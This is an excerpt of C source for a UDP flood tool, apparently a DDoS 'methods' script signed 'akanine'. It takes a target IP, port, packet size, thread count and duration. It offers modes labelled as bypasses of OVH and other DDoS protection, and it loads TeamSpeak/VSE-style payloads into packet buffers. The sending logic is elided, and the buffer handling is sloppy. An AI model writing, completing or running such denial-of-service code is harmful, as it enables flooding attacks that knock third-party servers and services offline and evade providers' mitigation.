...
{
        if(argc < 9){
                fprintf(stderr, "Invalid parameters! Custom-UDP Private Methods By akanine Updated on 1/1/2023 \n");
                fprintf(stdout, "Usage: %s <target IP> <port/0 for random> <packet_size> <threads> <-1> <time> <Checksum> <0/1/2/3> <bypass,ovh,ts3,vse> \n", argv[0]);
                exit(-1);
        }
        ...
        pps = 0;
        if (strcmp(PP, "ovh") == 0) {
            fprintf(stdout, "OVH Bypass......\n");
        }
        if (strcmp(PP, "bypass") == 0) {
            fprintf(stdout, "Methods Bypass......\n");
        }
        if (strcmp(PP, "esp") == 0) {
            fprintf(stdout, "ESP Bypass......\n");
        }
        if (strcmp(PP, "ts3") == 0) {
                fprintf(stdout, "TS3 Payload....\n");
                lench = 34;
        ...
        if (strcmp(PP, "0") == 0) {
                fprintf(stdout, "Deep Payload....\n");
                lench = 41;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
                packetstrx = "\x75\x64\x70\x20\x6D\x65\x74\x68\x6F\x64\x20\x4D\x61\x64\x65\x20\x42\x79\x20\x61\x6B\x61\x6E\x69\x6E\x65\x20\x6F\x6E\x20\x31\x37\x2F\x31\x32\x2F\x32\x30\x32\x32\x20";
        }
        
        
        if (strcmp(PP, "vse") == 0) {
                fprintf(stdout, "udp Payload....\n");
                lench = 25;
		packetstrx = malloc(lench);
		memset(packetstrx, 0x00, lench);
